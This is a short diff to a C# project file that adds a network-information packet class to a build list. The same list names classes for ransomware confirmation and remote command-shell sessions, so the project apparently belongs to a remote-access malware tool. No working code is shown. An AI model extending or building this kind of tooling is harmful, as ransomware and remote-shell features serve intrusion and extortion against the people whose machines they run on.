@@ -46,6 +46,7 @@
   <ItemGroup>
     <Compile Include="LoadingAPI.cs" />
     <Compile Include="Interface\IPacket.cs" />
+    <Compile Include="Packet\Miscellaneous\NetworkInformationPacket.cs" />
     <Compile Include="Packet\Ransomware\RansomwareConfirmationPacket.cs" />
     <Compile Include="Packet\Shell\StdOutShellSessionPacket.cs" />
     <Compile Include="Packet\Shell\NewCommandShellSessionPacket.cs" />
